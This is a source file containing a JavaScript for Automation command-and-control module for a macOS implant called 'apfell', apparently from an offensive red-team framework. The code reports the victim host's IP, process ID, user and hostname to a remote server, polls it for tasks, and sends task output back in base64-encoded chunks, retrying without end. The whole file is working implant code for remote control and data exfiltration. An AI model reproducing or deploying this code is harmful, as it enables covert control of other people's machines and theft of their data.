//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{
	constructor(interval, baseurl){
		super(interval, baseurl);
	}
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
		return {'baseurl': this.baseurl, 'interval': this.interval, 'killdate': ''};
	}
	setConfig(baseurl, interval, killdate){
		//A RESTful base config has 3 updatable components
		//  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
	}
	checkin(ip, pid, user, host){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		//gets back a unique ID
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
		//calls htmlPostData(url,data) to actually checkin
		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));
		apfell.id = jsondata.id;
		return jsondata;
	}
	getTasking(){
		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
		var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
		var task = this.htmlGetData(url);
		return JSON.parse(task);
	}
	postResponse(urlEnding, data){
		//depending on the amount of data we're sending, we might need to chunk it
		//  current chunks at 5kB, but we can change that later
		var size= 512000; //5000;
		var offset = 0;
		//console.log("total response size: " + data.length);
		do{
		    var csize = data.length - offset > size ? size : data.length - offset;
		    var dataChunk = data.subdataWithRange($.NSMakeRange(offset, csize));
		    var encodedChunk = dataChunk.base64EncodedStringWithOptions(0).js;
		    offset += csize;
		    var postData = {"response": encodedChunk};
		    var jsondata = this.htmlPostData(urlEnding, JSON.stringify(postData));
		}while(offset < data.length);
		/*
		for(var i = 0; i < data.length; i+=size){
			//console.log(i);
			var chunk = data.substring(i,i+size);
			//console.log(chunk);
			//base64 encode each chunk before we send it
			var chunk_nsstring = $.NSString.alloc.initWithCStringEncoding(chunk, $.NSData.NSUnicodeStringEncoding);
			//console.log(chunk_nsstring);
			var data_chunk = chunk_nsstring.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
			//console.log(data_chunk);
			var encoded_chunk = data_chunk.base64EncodedStringWithOptions(0).js;
			//console.log(encoded_chunk);
			var post_data = {"response":encoded_chunk};
			var jsondata = this.htmlPostData(urlEnding, JSON.stringify(post_data));
			//console.log("returned data: " + JSON.stringify(jsondata));
		}*/

		return jsondata;
	}
	htmlPostData(urlEnding, sendData){
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				var url = this.baseurl + urlEnding;
				//console.log(url);
				var data = $.NSString.alloc.initWithUTF8String(sendData);
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
				//console.log(resp);
				var jsondata = JSON.parse(resp);
				return jsondata;
			}
			catch(error){
			    $.NSThread.sleepForTimeInterval(C2.interval);  // don't spin out crazy if the connection fails
			}
		}
	}
	htmlGetData(url){
		return ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
	}
}
//------------- INSTANTIATE OUR C2 CLASS HERE -----------------------
